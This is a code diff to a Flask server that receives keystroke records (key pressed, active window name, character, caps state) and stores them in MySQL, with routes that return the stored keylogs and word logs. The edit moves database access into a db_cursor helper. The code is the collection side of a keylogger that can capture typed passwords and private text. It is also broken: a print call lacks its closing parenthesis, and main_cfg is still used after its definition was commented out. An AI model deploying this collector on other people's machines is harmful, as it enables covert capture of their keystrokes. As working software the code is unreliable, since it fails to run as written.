@@ -4,7 +4,7 @@ from json import JSONEncoder
 import mysql.connector
 from datetime import datetime
 from process import Process
-from load_config import load_cfg
+from load_config import db_cursor
 
 #start flask app
 app = Flask(__name__, template_folder='templates')
@@ -23,13 +23,8 @@ def addLog():
   data = json.loads(request.data)
   # Process.separateBreakChar(data)
 
-  for key in range(len(data)):
-    #print(data[str(key)])
-      #if (data[str(key)].isKeyDown == 1):
-     # Process.separateBreakChar(data[str(key)])
-      
+  for key in range(len(data)):      
     try:
-      
       print(data[str(key)].get('isKeyDown')
       pushDB_keys(json.loads(data[str(key)]))
       
@@ -44,17 +39,21 @@ def addLog():
 
 
 def pushDB_keys(payload):
-  main_cfg = load_cfg('./main_cfg.json')
+  # main_cfg = load_cfg('./main_cfg.json')
 
-  db = mysql.connector.connect (
-    host=main_cfg['dbHost'],
-    port=main_cfg['port'],
-    user=main_cfg['sqlUser'],
-    password=main_cfg['sqlPass'],
-    database=main_cfg['db']
-  )
+  # db = mysql.connector.connect (
+  #   host=main_cfg['dbHost'],
+  #   port=main_cfg['port'],
+  #   user=main_cfg['sqlUser'],
+  #   password=main_cfg['sqlPass'],
+  #   database=main_cfg['db']
+  # )
   
-  mycursor = db.cursor()
+  # mycursor = db.cursor()
+  if (payload['isKeyDown'] == 1):
+    Process.separateBreakChar(payload)
+    
+  mycursor = db_cursor()
   
   sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
   val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
@@ -93,18 +92,19 @@ def pushKeylog():
 
 @app.route('/showWordlog', methods=['GET'])
 def pushWordlog():
-  main_cfg = load_cfg('./main_cfg.json')
-  res = {}
+  # main_cfg = load_cfg('./main_cfg.json')
+  # res = {}
 
-  db = mysql.connector.connect (
-    host=main_cfg['dbHost'],
-    port=main_cfg['port'],
-    user=main_cfg['sqlUser'],
-    password=main_cfg['sqlPass'],
-    database=main_cfg['db']
-  )
+  # db = mysql.connector.connect (
+  #   host=main_cfg['dbHost'],
+  #   port=main_cfg['port'],
+  #   user=main_cfg['sqlUser'],
+  #   password=main_cfg['sqlPass'],
+  #   database=main_cfg['db']
+  # )
   
-  mycursor = db.cursor()
+  # mycursor = db.cursor()
+  mycursor = db_cursor()
   
   sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
   mycursor.execute(sql)
